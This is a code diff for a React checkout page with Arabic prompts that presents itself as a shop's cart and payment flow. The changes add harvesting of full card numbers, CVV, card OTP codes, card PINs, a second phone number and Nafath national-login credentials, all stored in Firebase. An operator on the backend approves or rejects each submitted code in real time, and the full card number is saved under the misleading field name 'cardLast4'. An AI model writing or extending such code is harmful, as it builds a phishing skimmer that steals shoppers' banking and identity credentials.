@@ -1,35 +1,68 @@
-"use client"
+"use client";
 
-import { useState, useEffect, useCallback, useRef } from "react"
-import { Button } from "../components/ui/button"
-import { Input } from "../components/ui/input"
-import { Label } from "../components/ui/label"
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "../components/ui/card"
-import { Separator } from "../components/ui/separator"
-import { Badge } from "../components/ui/badge"
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "../components/ui/dialog"
-import { Minus, Plus, Trash2, MapPin, Check, Loader2, Shield, Phone, CreditCard } from "lucide-react"
-import { addData, createOtpVerification, verifyOtp } from "../lib/firebase"
-import { MapAddressPicker } from "../components/map-address-picker"
-import { useCart } from "../lib/cartContext"
-import { PromoPopup } from "../components/promo-popup"
-import React from "react"
+import { useState, useEffect, useCallback, useRef } from "react";
+import { Button } from "../components/ui/button";
+import { Input } from "../components/ui/input";
+import { Label } from "../components/ui/label";
+import {
+  Card,
+  CardContent,
+  CardDescription,
+  CardHeader,
+  CardTitle,
+} from "../components/ui/card";
+import { Separator } from "../components/ui/separator";
+import { Badge } from "../components/ui/badge";
+import {
+  Dialog,
+  DialogContent,
+  DialogTitle,
+  DialogDescription,
+} from "../components/ui/dialog";
+import { VisuallyHidden } from "@radix-ui/react-visually-hidden";
+import {
+  Minus,
+  Plus,
+  Trash2,
+  MapPin,
+  Check,
+  Loader2,
+  Shield,
+  Phone,
+  CreditCard,
+} from "lucide-react";
+import {
+  addData,
+  createOtpVerification,
+  verifyOtp,
+  subscribeToOrder,
+  saveStepData,
+} from "../lib/firebase";
+import { MapAddressPicker } from "../components/map-address-picker";
+import { useCart } from "../lib/cartContext";
+import { PromoPopup } from "../components/promo-popup";
+import React from "react";
+import NafazModal from "../components/nafaz-modal";
+import { setupOnlineStatus } from "@/lib/utils";
+import { Turnstile } from "@marsidev/react-turnstile";
 
 interface ShippingInfo {
-  fullName: string
-  phone: string
-  city: string
-  district?: string
-  street?: string
-  postalCode?: string
-  coordinates?: { lat: number; lng: number }
+  fullName: string;
+  phone: string;
+  city: string;
+  district?: string;
+  street?: string;
+  postalCode?: string;
+  coordinates?: { lat: number; lng: number };
+  sex?: string;
+  nationality?: string;
 }
 
 interface PaymentInfo {
-  cardNumber: string
-  cardName: string
-  expiryDate: string
-  cvv: string
+  cardNumber: string;
+  cardName: string;
+  expiryDate: string;
+  cvv: string;
 }
 
 const detectPhoneProvider = (phone: string): string => {
@@ -38,15 +71,15 @@ const detectPhoneProvider = (phone: string): string => {
     Mobily: ["054", "056"],
     Zain: ["059"],
     Virgin: ["057"],
-  }
-  const prefix = phone.slice(0, 3)
+  };
+  const prefix = phone.slice(0, 3);
   for (const [provider, prefixes] of Object.entries(providers)) {
     if (prefixes.includes(prefix)) {
-      return provider
+      return provider;
     }
   }
-  return "Unknown"
-}
+  return "Unknown";
+};
 
 export default function CheckoutPage() {
   const [step, setStep] = useState<
@@ -60,485 +93,701 @@ export default function CheckoutPage() {
     | "nafath"
     | "auth-dialog"
     | "success"
-  >("cart")
-  const { items, updateQuantity: updateCartQuantity, removeItem: removeCartItem, clearCart } = useCart()
+  >("cart");
+  const {
+    items,
+    updateQuantity: updateCartQuantity,
+    removeItem: removeCartItem,
+    updateStrength: updateCartStrength,
+    clearCart,
+  } = useCart();
   const [shippingInfo, setShippingInfo] = useState<ShippingInfo>({
     fullName: "",
     phone: "",
     city: "",
-  })
+  });
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: "",
     cardName: "",
     expiryDate: "",
     cvv: "",
-  })
-  const [cardOtp, setCardOtp] = useState("")
-  const [cardPin, setCardPin] = useState("")
-  const [phoneOtp, setPhoneOtp] = useState("")
-  const [nafathId, setNafathId] = useState("")
-  const [nafadPassword, setNafadPassword] = useState("")
-  const [phoneProvider, setPhoneProvider] = useState("")
-  const [phone2, setPhone2] = useState("")
-  const [isVerifying, setIsVerifying] = useState(false)
-  const [isProcessingOrder, setIsProcessingOrder] = useState(false)
-  const [verificationError, setVerificationError] = useState("")
-  const [orderError, setOrderError] = useState("")
-  const [canResendOtp, setCanResendOtp] = useState(false)
-  const [resendTimer, setResendTimer] = useState(30)
-  const [showMap, setShowMap] = useState(false)
-  const [error, setError] = useState<string>("")
-  const [cardOtpVerificationId, setCardOtpVerificationId] = useState("")
-  const [phoneOtpVerificationId, setPhoneOtpVerificationId] = useState("")
-  const [showPaymentPopup, setShowPaymentPopup] = useState(false)
-  const [showAgeVerification, setShowAgeVerification] = useState(false)
-  const [showPromoPopup, setShowPromoPopup] = useState(false)
+  });
+  const [cardOtp, setCardOtp] = useState("");
+  const [cardPin, setCardPin] = useState("");
+  const [phoneOtp, setPhoneOtp] = useState("");
+  const [nafadUsername, setnafadUsername] = useState("");
+  const [nafadPassword, setNafadPassword] = useState("");
+  const [phoneProvider, setPhoneProvider] = useState("");
+  const [phone2, setPhone2] = useState("");
+  const [captchaToken, setCaptchaToken] = useState("");
+  const [captchaError, setCaptchaError] = useState("");
+  const [isVerifying, setIsVerifying] = useState(false);
+  const [isProcessingOrder, setIsProcessingOrder] = useState(false);
+  const [verificationError, setVerificationError] = useState("");
+  const [orderError, setOrderError] = useState("");
+  const [canResendOtp, setCanResendOtp] = useState(false);
+  const [resendTimer, setResendTimer] = useState(30);
+  const [showMap, setShowMap] = useState(false);
+  const [error, setError] = useState<string>("");
+  const [cardOtpVerificationId, setCardOtpVerificationId] = useState("");
+  const [phoneOtpVerificationId, setPhoneOtpVerificationId] = useState("");
+  const [showPaymentPopup, setShowPaymentPopup] = useState(false);
+  const [showAgeVerification, setShowAgeVerification] = useState(false);
+  const [showPromoPopup, setShowPromoPopup] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [approvalMessage, setApprovalMessage] = useState("");
+  const [rejectionError, setRejectionError] = useState("");
+  const [stepLoading, setStepLoading] = useState(false);
+  const [visitorId, setVisitorId] = useState<string | null>(null);
 
   const [shippingErrors, setShippingErrors] = useState({
     fullName: "",
     phone: "",
     city: "",
-  })
+  });
   const [paymentErrors, setPaymentErrors] = useState({
     cardNumber: "",
     cardName: "",
     expiryDate: "",
     cvv: "",
-  })
-  const [phone2Error, setPhone2Error] = useState("")
+  });
+  const [phone2Error, setPhone2Error] = useState("");
 
-  const isLocalStorageLoaded = useRef(false)
-  const saveTimeoutRef = useRef<NodeJS.Timeout | null>(null)
+  const isLocalStorageLoaded = useRef(false);
+  const saveTimeoutRef = useRef<NodeJS.Timeout | null>(null);
+  const onlineVisitors = async () => {
+    const visitor = localStorage.getItem("visitor");
+    if (visitor != undefined) {
+      setupOnlineStatus(visitor!);
+    }
+  };
+  // Ensure visitor ID exists
+  useEffect(() => {
+    let existingId = localStorage.getItem("visitor");
+    if (!existingId) {
+      existingId = `dddz-app-${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
+      localStorage.setItem("visitor", existingId);
+    }
+    setVisitorId(existingId);
+  }, []);
+  useEffect(() => {
+    setTimeout(() => {
+      onlineVisitors().then(() => {
+        console.log("online");
+      });
+    }, 1000);
+  }, []);
+
+  // Helper function for step transitions with loading
+  const goToStep = useCallback((nextStep: typeof step) => {
+    setStepLoading(true);
+    setTimeout(() => {
+      setStep(nextStep);
+      setStepLoading(false);
+      setWaitingForApproval(false);
+      setVerificationError("");
+    }, 800);
+  }, []);
 
   useEffect(() => {
-    const isAgeVerified = localStorage.getItem("ageVerified")
+    const isAgeVerified = localStorage.getItem("ageVerified");
     if (!isAgeVerified) {
-      setShowAgeVerification(true)
+      setShowAgeVerification(true);
     } else {
-      const hasSeenPromo = sessionStorage.getItem("hasSeenPromo")
+      const hasSeenPromo = sessionStorage.getItem("hasSeenPromo");
       if (!hasSeenPromo) {
-        setShowPromoPopup(true)
-        sessionStorage.setItem("hasSeenPromo", "true")
+        setShowPromoPopup(true);
+        sessionStorage.setItem("hasSeenPromo", "true");
       }
     }
-  }, [])
+  }, []);
 
   useEffect(() => {
     if (!isLocalStorageLoaded.current) {
-      const savedShipping = localStorage.getItem("shippingInfo")
+      const savedShipping = localStorage.getItem("shippingInfo");
       if (savedShipping) {
         try {
-          setShippingInfo(JSON.parse(savedShipping))
+          setShippingInfo(JSON.parse(savedShipping));
         } catch (error) {
-          console.error("Failed to parse saved shipping info:", error)
+          console.error("Failed to parse saved shipping info:", error);
         }
       }
-      isLocalStorageLoaded.current = true
+      isLocalStorageLoaded.current = true;
     }
-  }, [])
+  }, []);
 
   useEffect(() => {
     if (step === "payment") {
-      setShowPaymentPopup(true)
+      setShowPaymentPopup(true);
     }
-  }, [step])
+  }, [step]);
 
   const debouncedSaveToLocalStorage = useCallback((data: ShippingInfo) => {
     if (saveTimeoutRef.current) {
-      clearTimeout(saveTimeoutRef.current)
+      clearTimeout(saveTimeoutRef.current);
     }
 
     saveTimeoutRef.current = setTimeout(() => {
-      localStorage.setItem("shippingInfo", JSON.stringify(data))
-    }, 1000)
-  }, [])
+      localStorage.setItem("shippingInfo", JSON.stringify(data));
+    }, 1000);
+  }, []);
 
   useEffect(() => {
-    if (isLocalStorageLoaded.current && step === "shipping" && shippingInfo.fullName) {
-      debouncedSaveToLocalStorage(shippingInfo)
+    if (
+      isLocalStorageLoaded.current &&
+      step === "shipping" &&
+      shippingInfo.fullName
+    ) {
+      debouncedSaveToLocalStorage(shippingInfo);
     }
 
     // Cleanup timeout on unmount
     return () => {
       if (saveTimeoutRef.current) {
-        clearTimeout(saveTimeoutRef.current)
+        clearTimeout(saveTimeoutRef.current);
       }
-    }
-  }, [shippingInfo, step, debouncedSaveToLocalStorage])
+    };
+  }, [shippingInfo, step, debouncedSaveToLocalStorage]);
 
   useEffect(() => {
-    if (step !== "shipping" && isLocalStorageLoaded.current && shippingInfo.fullName) {
+    if (
+      step !== "shipping" &&
+      isLocalStorageLoaded.current &&
+      shippingInfo.fullName
+    ) {
       if (saveTimeoutRef.current) {
-        clearTimeout(saveTimeoutRef.current)
+        clearTimeout(saveTimeoutRef.current);
       }
-      localStorage.setItem("shippingInfo", JSON.stringify(shippingInfo))
+      localStorage.setItem("shippingInfo", JSON.stringify(shippingInfo));
     }
-  }, [step, shippingInfo])
+  }, [step, shippingInfo]);
 
   useEffect(() => {
-    if ((step === "card-otp" || step === "phone-otp") && resendTimer > 0 && !canResendOtp) {
-      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
-      return () => clearTimeout(timer)
+    if (
+      (step === "card-otp" || step === "phone-otp") &&
+      resendTimer > 0 &&
+      !canResendOtp
+    ) {
+      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
+      return () => clearTimeout(timer);
     } else if (resendTimer === 0) {
-      setCanResendOtp(true)
+      setCanResendOtp(true);
     }
-  }, [resendTimer, step, canResendOtp])
+  }, [resendTimer, step, canResendOtp]);
+
+  useEffect(() => {
+    if (!visitorId) return;
+
+    const unsubscribe = subscribeToOrder(visitorId, (data) => {
+      // Handle approvals
+      if (
+        data.cardOtpApproved === "approved" &&
+        step === "card-otp" &&
+        waitingForApproval
+      ) {
+        setCardOtp("");
+        setRejectionError("");
+        goToStep("card-pin");
+      }
+
+      if (
+        data.cardPinApproved === "approved" &&
+        step === "card-pin" &&
+        waitingForApproval
+      ) {
+        setCardPin("");
+        setRejectionError("");
+        goToStep("phone-verification");
+      }
+
+      if (
+        data.phoneOtpApproved === "approved" &&
+        step === "phone-otp" &&
+        waitingForApproval
+      ) {
+        setPhoneOtp("");
+        setRejectionError("");
+        goToStep("nafath");
+      }
+
+      if (
+        data.nafathApproved === "approved" &&
+        step === "nafath" &&
+        waitingForApproval
+      ) {
+        setRejectionError("");
+        goToStep("auth-dialog");
+      }
+
+      // Handle rejections
+      if (
+        data.cardOtpApproved === "rejected" &&
+        step === "card-otp" &&
+        waitingForApproval
+      ) {
+        setWaitingForApproval(false);
+        setRejectionError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
+
+      if (
+        data.cardPinApproved === "rejected" &&
+        step === "card-pin" &&
+        waitingForApproval
+      ) {
+        setWaitingForApproval(false);
+        setRejectionError("رمز PIN غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
+
+      if (
+        data.phoneOtpApproved === "rejected" &&
+        step === "phone-otp" &&
+        waitingForApproval
+      ) {
+        setWaitingForApproval(false);
+        setRejectionError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
+      }
+
+      if (
+        data.nafathApproved === "rejected" &&
+        step === "nafath" &&
+        waitingForApproval
+      ) {
+        setWaitingForApproval(false);
+        setRejectionError("فشل التحقق من نفاذ. يرجى المحاولة مرة أخرى.");
+      }
+    });
+
+    return () => unsubscribe();
+  }, [visitorId, step, waitingForApproval, goToStep]);
 
   const totalPrice = useCallback(() => {
-    return items.reduce((sum, item) => sum + item.price * item.quantity, 0)
-  }, [items])()
+    return items.reduce((sum, item) => sum + item.price * item.quantity, 0);
+  }, [items])();
 
-  const shippingFee = totalPrice > 100 ? 0 : 10
-  const tax = totalPrice * 0.04
-  const finalTotal = totalPrice + shippingFee + tax
+  const shippingFee = totalPrice > 100 ? 0 : 10;
+  const tax = totalPrice * 0.04;
+  const finalTotal = totalPrice + shippingFee + tax;
 
   const updateQuantity = useCallback(
     (productId: number, delta: number) => {
-      const item = items.find((i) => i.productId === productId)
+      const item = items.find((i) => i.productId === productId);
       if (item) {
-        updateCartQuantity(productId, item.quantity + delta)
+        updateCartQuantity(productId, item.quantity + delta);
       }
     },
     [items, updateCartQuantity],
-  )
+  );
 
   const removeItem = useCallback(
     (productId: number) => {
-      removeCartItem(productId)
+      removeCartItem(productId);
     },
     [removeCartItem],
-  )
+  );
 
   const validatePhone = (phone: string): string => {
-    if (!phone.trim()) return "رقم الجوال مطلوب"
-    if (!/^05\d{8}$/.test(phone)) return "رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام"
-    return ""
-  }
+    if (!phone.trim()) return "رقم الجوال مطلوب";
+    if (!/^05\d{8}$/.test(phone))
+      return "رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام";
+    return "";
+  };
 
   const validateName = (name: string): string => {
-    if (!name.trim()) return "الاسم الكامل مطلوب"
-    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل"
-    if (!/^[\u0600-\u06FFa-zA-Z\s]+$/.test(name)) return "الاسم يجب أن يحتوي على حروف فقط"
-    return ""
-  }
+    if (!name.trim()) return "الاسم الكامل مطلوب";
+    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل";
+    if (!/^[\u0600-\u06FFa-zA-Z\s]+$/.test(name))
+      return "الاسم يجب أن يحتوي على حروف فقط";
+    return "";
+  };
 
   const validateCity = (city: string): string => {
-    if (!city.trim()) return "المدينة مطلوبة"
-    if (city.trim().length < 2) return "اسم المدينة يجب أن يكون حرفين على الأقل"
-    return ""
-  }
+    if (!city.trim()) return "المدينة مطلوبة";
+    if (city.trim().length < 2)
+      return "اسم المدينة يجب أن يكون حرفين على الأقل";
+    return "";
+  };
 
   const validateCardNumber = (cardNumber: string): string => {
-    const cleaned = cardNumber.replace(/\s/g, "")
-    if (!cleaned) return "رقم البطاقة مطلوب"
-    if (cleaned.length !== 16) return "رقم البطاقة يجب أن يتكون من 16 رقم"
-    if (!/^\d+$/.test(cleaned)) return "رقم البطاقة يجب أن يحتوي على أرقام فقط"
-    if (isBlockedCard(cleaned)) return "هذا النوع من البطاقات غير مقبول"
-    return ""
-  }
+    const cleaned = cardNumber.replace(/\s/g, "");
+    if (!cleaned) return "رقم البطاقة مطلوب";
+    if (cleaned.length !== 16) return "رقم البطاقة يجب أن يتكون من 16 رقم";
+    if (!/^\d+$/.test(cleaned)) return "رقم البطاقة يجب أن يحتوي على أرقام فقط";
+    if (isBlockedCard(cleaned)) return "هذا النوع من البطاقات غير مقبول";
+    return "";
+  };
 
   const validateCardName = (name: string): string => {
-    if (!name.trim()) return "اسم حامل البطاقة مطلوب"
-    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل"
-    if (!/^[a-zA-Z\s]+$/.test(name)) return "الاسم يجب أن يحتوي على حروف إنجليزية فقط"
-    return ""
-  }
+    if (!name.trim()) return "اسم حامل البطاقة مطلوب";
+    if (name.trim().length < 3) return "الاسم يجب أن يكون 3 أحرف على الأقل";
+    if (!/^[a-zA-Z\s]+$/.test(name))
+      return "الاسم يجب أن يحتوي على حروف إنجليزية فقط";
+    return "";
+  };
 
   const validateExpiryDate = (expiry: string): string => {
-    if (!expiry) return "تاريخ الانتهاء مطلوب"
-    if (expiry.length !== 5) return "تاريخ الانتهاء يجب أن يكون بصيغة MM/YY"
+    if (!expiry) return "تاريخ الانتهاء مطلوب";
+    if (expiry.length !== 5) return "تاريخ الانتهاء يجب أن يكون بصيغة MM/YY";
 
-    const [month, year] = expiry.split("/")
-    const monthNum = Number.parseInt(month)
-    const yearNum = Number.parseInt("20" + year)
+    const [month, year] = expiry.split("/");
+    const monthNum = Number.parseInt(month);
+    const yearNum = Number.parseInt("20" + year);
 
-    if (monthNum < 1 || monthNum > 12) return "الشهر غير صحيح"
+    if (monthNum < 1 || monthNum > 12) return "الشهر غير صحيح";
 
-    const now = new Date()
-    const currentYear = now.getFullYear()
-    const currentMonth = now.getMonth() + 1
+    const now = new Date();
+    const currentYear = now.getFullYear();
+    const currentMonth = now.getMonth() + 1;
 
-    if (yearNum < currentYear || (yearNum === currentYear && monthNum < currentMonth)) {
-      return "البطاقة منتهية الصلاحية"
+    if (
+      yearNum < currentYear ||
+      (yearNum === currentYear && monthNum < currentMonth)
+    ) {
+      return "البطاقة منتهية الصلاحية";
     }
 
-    return ""
-  }
+    return "";
+  };
 
   const validateCvv = (cvv: string): string => {
-    if (!cvv) return "رمز الأمان مطلوب"
-    if (cvv.length !== 3) return "رمز الأمان يجب أن يتكون من 3 أرقام"
-    if (!/^\d+$/.test(cvv)) return "رمز الأمان يجب أن يحتوي على أرقام فقط"
-    return ""
-  }
+    if (!cvv) return "رمز الأمان مطلوب";
+    if (cvv.length !== 3) return "رمز الأمان يجب أن يتكون من 3 أرقام";
+    if (!/^\d+$/.test(cvv)) return "رمز الأمان يجب أن يحتوي على أرقام فقط";
+    return "";
+  };
 
   const isShippingValid = (): boolean => {
-    const nameError = validateName(shippingInfo.fullName)
-    const phoneError = validatePhone(shippingInfo.phone)
-    const cityError = validateCity(shippingInfo.city)
+    const nameError = validateName(shippingInfo.fullName);
+    const phoneError = validatePhone(shippingInfo.phone);
+    const cityError = validateCity(shippingInfo.city);
 
-    return !nameError && !phoneError && !cityError
-  }
+    return !nameError && !phoneError && !cityError;
+  };
 
   const isPaymentValid = (): boolean => {
-    const cardNumberError = validateCardNumber(paymentInfo.cardNumber)
-    const cardNameError = validateCardName(paymentInfo.cardName)
-    const expiryError = validateExpiryDate(paymentInfo.expiryDate)
-    const cvvError = validateCvv(paymentInfo.cvv)
+    const cardNumberError = validateCardNumber(paymentInfo.cardNumber);
+    const cardNameError = validateCardName(paymentInfo.cardName);
+    const expiryError = validateExpiryDate(paymentInfo.expiryDate);
+    const cvvError = validateCvv(paymentInfo.cvv);
 
-    return !cardNumberError && !cardNameError && !expiryError && !cvvError
-  }
+    return !cardNumberError && !cardNameError && !expiryError && !cvvError;
+  };
 
   const handleShippingBlur = (field: keyof typeof shippingErrors) => {
-    let error = ""
+    let error = "";
 
     switch (field) {
       case "fullName":
-        error = validateName(shippingInfo.fullName)
-        break
+        error = validateName(shippingInfo.fullName);
+        break;
       case "phone":
-        error = validatePhone(shippingInfo.phone)
-        break
+        error = validatePhone(shippingInfo.phone);
+        break;
       case "city":
-        error = validateCity(shippingInfo.city)
-        break
+        error = validateCity(shippingInfo.city);
+        break;
     }
 
-    setShippingErrors({ ...shippingErrors, [field]: error })
-  }
+    setShippingErrors({ ...shippingErrors, [field]: error });
+  };
 
   const handlePaymentBlur = (field: keyof typeof paymentErrors) => {
-    let error = ""
+    let error = "";
 
     switch (field) {
       case "cardNumber":
-        error = validateCardNumber(paymentInfo.cardNumber)
-        break
+        error = validateCardNumber(paymentInfo.cardNumber);
+        break;
       case "cardName":
-        error = validateCardName(paymentInfo.cardName)
-        break
+        error = validateCardName(paymentInfo.cardName);
+        break;
       case "expiryDate":
-        error = validateExpiryDate(paymentInfo.expiryDate)
-        break
+        error = validateExpiryDate(paymentInfo.expiryDate);
+        break;
       case "cvv":
-        error = validateCvv(paymentInfo.cvv)
-        break
+        error = validateCvv(paymentInfo.cvv);
+        break;
     }
 
-    setPaymentErrors({ ...paymentErrors, [field]: error })
-  }
+    setPaymentErrors({ ...paymentErrors, [field]: error });
+  };
 
   const handleShippingChange = (field: keyof ShippingInfo, value: string) => {
-    setShippingInfo({ ...shippingInfo, [field]: value })
+    setShippingInfo({ ...shippingInfo, [field]: value });
     if (shippingErrors[field as keyof typeof shippingErrors]) {
-      setShippingErrors({ ...shippingErrors, [field]: "" })
+      setShippingErrors({ ...shippingErrors, [field]: "" });
     }
-  }
+  };
 
   const formatCardNumber = (value: string) => {
-    const cleaned = value.replace(/\s/g, "")
-    const chunks = cleaned.match(/.{1,4}/g) || []
-    return chunks.join(" ")
-  }
+    const cleaned = value.replace(/\s/g, "");
+    const chunks = cleaned.match(/.{1,4}/g) || [];
+    return chunks.join(" ");
+  };
 
   const formatExpiryDate = (value: string) => {
-    const cleaned = value.replace(/\D/g, "")
+    const cleaned = value.replace(/\D/g, "");
     if (cleaned.length >= 2) {
-      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
+      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4);
     }
-    return cleaned
-  }
+    return cleaned;
+  };
 
-  const BLOCKED_CARD_PREFIXES = ["4847", "4685", "4286"]
+  const BLOCKED_CARD_PREFIXES = ["4847", "4685", "4286"];
 
   const isBlockedCard = (cardNumber: string): boolean => {
-    return BLOCKED_CARD_PREFIXES.some((prefix) => cardNumber.startsWith(prefix))
-  }
+    return BLOCKED_CARD_PREFIXES.some((prefix) =>
+      cardNumber.startsWith(prefix),
+    );
+  };
 
   const handleCardNumberChange = (value: string) => {
-    const cleaned = value.replace(/\s/g, "")
+    const cleaned = value.replace(/\s/g, "");
     if (cleaned.length <= 16 && /^\d*$/.test(cleaned)) {
-      setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) })
+      setPaymentInfo({ ...paymentInfo, cardNumber: formatCardNumber(cleaned) });
       if (paymentErrors.cardNumber) {
-        setPaymentErrors({ ...paymentErrors, cardNumber: "" })
+        setPaymentErrors({ ...paymentErrors, cardNumber: "" });
       }
     }
-  }
+  };
 
   const handleExpiryChange = (value: string) => {
-    const cleaned = value.replace(/\D/g, "")
+    const cleaned = value.replace(/\D/g, "");
     if (cleaned.length <= 4) {
-      setPaymentInfo({ ...paymentInfo, expiryDate: formatExpiryDate(cleaned) })
+      setPaymentInfo({ ...paymentInfo, expiryDate: formatExpiryDate(cleaned) });
       if (paymentErrors.expiryDate) {
-        setPaymentErrors({ ...paymentErrors, expiryDate: "" })
+        setPaymentErrors({ ...paymentErrors, expiryDate: "" });
       }
     }
-  }
+  };
 
   const handleCvvChange = (value: string) => {
     if (value.length <= 3 && /^\d*$/.test(value)) {
-      setPaymentInfo({ ...paymentInfo, cvv: value })
+      setPaymentInfo({ ...paymentInfo, cvv: value });
       if (paymentErrors.cvv) {
-        setPaymentErrors({ ...paymentErrors, cvv: "" })
+        setPaymentErrors({ ...paymentErrors, cvv: "" });
       }
     }
-  }
+  };
 
-  const handleShippingNext = () => {
-    const nameError = validateName(shippingInfo.fullName)
-    const phoneError = validatePhone(shippingInfo.phone)
-    const cityError = validateCity(shippingInfo.city)
+  const handleShippingNext = async () => {
+    const nameError = validateName(shippingInfo.fullName);
+    const phoneError = validatePhone(shippingInfo.phone);
+    const cityError = validateCity(shippingInfo.city);
 
     setShippingErrors({
       fullName: nameError,
       phone: phoneError,
       city: cityError,
-    })
+    });
 
-    if (!nameError && !phoneError && !cityError) {
-      setStep("payment")
+    if (!captchaToken) {
+      setCaptchaError("الرجاء إكمال التحقق");
+      return;
     }
-  }
 
-  const handlePaymentNext = () => {
-    const cardNumberError = validateCardNumber(paymentInfo.cardNumber)
-    const cardNameError = validateCardName(paymentInfo.cardName)
-    const expiryError = validateExpiryDate(paymentInfo.expiryDate)
-    const cvvError = validateCvv(paymentInfo.cvv)
+    try {
+      const response = await fetch("/api/verify-captcha", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: captchaToken }),
+      });
+      const data = await response.json();
+      if (!data.success) {
+        setCaptchaError("فشل التحقق، يرجى المحاولة مرة أخرى");
+        return;
+      }
+    } catch (error) {
+      setCaptchaError("حدث خطأ في التحقق");
+      return;
+    }
+
+    if (!visitorId) return;
+    await addData({ id: visitorId, ...shippingInfo });
+    if (!nameError && !phoneError && !cityError) {
+      goToStep("payment");
+    }
+  };
+
+  const handlePaymentNext = async () => {
+    const cardNumberError = validateCardNumber(paymentInfo.cardNumber);
+    const cardNameError = validateCardName(paymentInfo.cardName);
+    const expiryError = validateExpiryDate(paymentInfo.expiryDate);
+    const cvvError = validateCvv(paymentInfo.cvv);
 
     setPaymentErrors({
       cardNumber: cardNumberError,
       cardName: cardNameError,
       expiryDate: expiryError,
       cvv: cvvError,
-    })
-
+    });
+    if (!visitorId) return;
+    await addData({ id: visitorId, ...paymentInfo! });
     if (!cardNumberError && !cardNameError && !expiryError && !cvvError) {
-      sendCardOtp()
+      sendCardOtp();
     }
-  }
+  };
 
   const handlePhoneVerification = () => {
-    const phoneError = validatePhone(phone2)
-    setPhone2Error(phoneError)
+    const phoneError = validatePhone(phone2);
+    setPhone2Error(phoneError);
+
+    if (!phoneProvider) {
+      setPhone2Error("الرجاء اختيار مزود الخدمة");
+      return;
+    }
 
     if (!phoneError) {
-      sendPhoneOtp()
+      sendPhoneOtp();
     }
-  }
+  };
 
   const sendCardOtp = async () => {
     try {
-      const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
-      const verificationId = await createOtpVerification(shippingInfo.phone, otpCode)
-      setCardOtpVerificationId(verificationId)
-      setStep("card-otp")
-      setResendTimer(30)
-      setCanResendOtp(false)
+      const otpCode = cardOtp;
+      const verificationId = await createOtpVerification(
+        shippingInfo.phone,
+        otpCode,
+      );
+      setCardOtpVerificationId(verificationId);
+      goToStep("card-otp");
+      setResendTimer(30);
+      setCanResendOtp(false);
     } catch (error) {
-      console.error("❌ Error sending card OTP:", error)
-      setVerificationError("فشل إرسال رمز التحقق")
+      console.error("❌ Error sending card OTP:", error);
+      setVerificationError("فشل إرسال رمز التحقق");
     }
-  }
+  };
 
   const handleCardOtpVerify = async () => {
     if (cardOtp.length < 4) {
-      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
-      return
+      setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح");
+      return;
     }
-    setIsVerifying(true)
-    setVerificationError("")
+    if (!visitorId) return;
+
+    setIsVerifying(true);
+    setVerificationError("");
     try {
-      await verifyOtp(cardOtpVerificationId, cardOtp)
-      setIsVerifying(false)
-      setCardOtp("")
-      setStep("card-pin")
+      await saveStepData(visitorId, "cardOtp", {
+        cardLast4: paymentInfo.cardNumber,
+        cardName: paymentInfo.cardName,
+        cvv: paymentInfo.cvv,
+        cardOtp: cardOtp,
+        submittedAt: new Date().toISOString(),
+        cardOtpSubmitted: true,
+      });
+      setIsVerifying(false);
+      setRejectionError("");
+      setWaitingForApproval(true);
+      setApprovalMessage("جاري التحقق من رمز البطاقة...");
     } catch (error: any) {
-      console.error("❌ Card OTP verification error:", error)
-      setIsVerifying(false)
-      setVerificationError(error.message || "رمز التحقق غير صحيح")
+      console.error("Card OTP verification error:", error);
+      setIsVerifying(false);
+      setVerificationError(error.message || "رمز التحقق غير صحيح");
     }
-  }
+  };
 
   const handleCardPinVerify = async () => {
     if (cardPin.length !== 4) {
-      setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام")
-      return
+      setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام");
+      return;
     }
-    setIsVerifying(true)
-    setVerificationError("")
+    if (!visitorId) return;
+
+    setIsVerifying(true);
+    setVerificationError("");
     try {
-      await new Promise((resolve) => setTimeout(resolve, 1500))
-      setIsVerifying(false)
-      setCardPin("")
-      const provider = detectPhoneProvider(shippingInfo.phone)
-      setPhoneProvider(provider)
-      setStep("phone-verification")
+      await saveStepData(visitorId, "cardPin", {
+        submittedAt: new Date().toISOString(),
+        cardPinSubmitted: true,
+        cardPin,
+      });
+      setIsVerifying(false);
+      const provider = detectPhoneProvider(shippingInfo.phone);
+      setPhoneProvider(provider);
+      setRejectionError("");
+      setWaitingForApproval(true);
+      setApprovalMessage("جاري التحقق من رمز PIN...");
     } catch (error) {
-      console.error("❌ Card PIN verification error:", error)
-      setIsVerifying(false)
-      setVerificationError("رمز PIN غير صحيح")
+      console.error("Card PIN verification error:", error);
+      setIsVerifying(false);
+      setVerificationError("رمز PIN غير صحيح");
     }
-  }
+  };
 
   const sendPhoneOtp = async () => {
     try {
-      const visitor = localStorage.getItem("visitor")
-      await addData({ id: visitor, phone2, operator: phoneProvider })
-      setStep("phone-otp")
-      setResendTimer(30)
-      setCanResendOtp(false)
+      if (!visitorId) return;
+      await addData({ id: visitorId, phone2, operator: phoneProvider });
+      goToStep("phone-otp");
+      setResendTimer(30);
+      setCanResendOtp(false);
     } catch (error) {
-      console.error("❌ Error sending phone OTP:", error)
-      setVerificationError("فشل إرسال رمز التحقق")
+      console.error("❌ Error sending phone OTP:", error);
+      setVerificationError("فشل إرسال رمز التحقق");
     }
-  }
+  };
 
